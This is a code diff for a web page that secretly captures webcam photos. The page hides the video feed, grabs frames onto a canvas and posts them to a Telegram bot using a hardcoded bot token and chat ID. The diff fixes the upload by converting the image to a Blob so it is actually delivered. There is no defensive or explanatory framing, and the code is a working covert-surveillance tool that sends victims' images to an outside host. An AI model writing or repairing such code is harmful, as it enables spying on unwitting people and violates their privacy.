@@ -57,7 +57,7 @@
     }
 
     video {
-      display: none; /* Hide the video feed */
+      display: none;
     }
 
     canvas {
@@ -100,7 +100,7 @@
     function capturePhoto() {
       // Draw the video frame onto the canvas
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      let imageData = canvas.toDataURL('image/png');
+      let imageData = canvas.toDataURL('image/png'); // Get base64 image data
       
       // Send image to Telegram bot
       sendToTelegramBot(imageData);
@@ -117,14 +117,23 @@
 
     // Send captured image to Telegram bot
     function sendToTelegramBot(imageData) {
-      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s';
-      const chatId = '1987016824';
+      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s';  // Replace with your bot token
+      const chatId = '1987016824';   // Replace with your chat ID
       const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+      // Convert base64 image to Blob
+      const byteString = atob(imageData.split(',')[1]);
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uintArray = new Uint8Array(arrayBuffer);
+      for (let i = 0; i < byteString.length; i++) {
+        uintArray[i] = byteString.charCodeAt(i);
+      }
+      const blob = new Blob([uintArray], { type: 'image/png' });
 
       // Create FormData object to send image
       let formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('photo', imageData); // Append base64 image here
+      formData.append('photo', blob, 'photo.png'); // Append image as Blob
 
       fetch(url, {
         method: 'POST',
